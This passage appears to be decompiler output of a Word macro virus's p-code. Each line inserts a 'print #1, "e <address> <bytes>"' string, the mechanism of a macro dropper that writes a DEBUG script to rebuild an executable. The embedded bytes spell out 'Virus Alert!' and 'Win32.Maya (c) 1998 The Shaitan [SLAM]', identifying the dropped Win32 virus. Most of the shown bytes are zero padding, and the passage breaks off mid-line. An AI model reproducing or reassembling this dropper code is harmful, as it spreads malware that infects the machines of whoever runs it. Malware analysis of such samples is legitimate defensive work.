' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #356:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16e0 70 e3 e2 3f e3 8e 3e 3c 70 e0 02 3f e0 0e 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #357:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16f0 70 e0 02 3f e0 0e 00 00 70 ff ff ff ff ff ff ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #358:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1700 f0 ff ff ff ff ff ff ff f0 ff ff ff ff ff ff ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #359:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1710 f0 6a 30 68 2b 20 40 00 68 38 20 40 00 6a 00 e8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #360:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1720 47 00 00 00 6a 00 e8 3a 00 00 00 56 69 72 75 73 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #361:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1730 20 41 6c 65 72 74 21 00 57 69 6e 33 32 2e 4d 61 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #362:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1740 79 61 20 28 63 29 20 31 39 39 38 20 54 68 65 20 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #363:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1750 53 68 61 69 74 61 6e 20 5b 53 4c 41 4d 5d 00 ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #364:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1760 25 50 40 40 00 ff 25 54 40 40 00 ff 25 5c 40 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #365:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #366:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #367:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #368:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #369:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #370:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #371:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #372:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #373:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #374:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #375:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #376:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #377:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #378:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #379:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #380:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #381:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #382:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #383:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #384:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #385:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #386:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #387:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #388:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #389:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #390:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1900 41 59 41 4d 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #391:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #392:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #393:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #394:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #395:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #396:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #397:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #398:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #399:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #400:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #401:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #402:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #403:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #404:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #405:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 19f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #406:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #407:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #408:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #409:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #410:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
